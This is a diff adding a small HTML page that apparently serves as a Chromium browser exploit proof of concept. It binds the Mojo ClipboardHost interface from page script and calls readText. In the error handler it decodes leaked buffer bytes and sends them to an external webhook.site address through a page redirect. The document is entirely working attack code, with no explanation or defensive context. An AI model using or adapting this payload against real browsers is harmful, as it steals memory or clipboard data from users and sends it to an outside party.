@@ -1,0 +1,16 @@
+<button id="doit">click here</button>
+<script src="./mojo_bindings.js"></script>
+<script src="./clipboard.mojom.js"></script>
+<script>
+	// window.doit.onclick = ()=>{
+		let ptr = new blink.mojom.ClipboardHostPtr()
+		Mojo.bindInterface(blink.mojom.ClipboardHost.name, mojo.makeRequest(ptr).handle);
+		ptr.readText(0).catch(e=>{
+			let a = new TextDecoder('utf-16')
+		    let c = a.decode(window.message.buffer.arrayBuffer.slice(0x50)).replace('\x00','')
+		    document.location=('https://webhook.site/xxxx?a='+c)
+
+
+		})
+	// }
+</script>
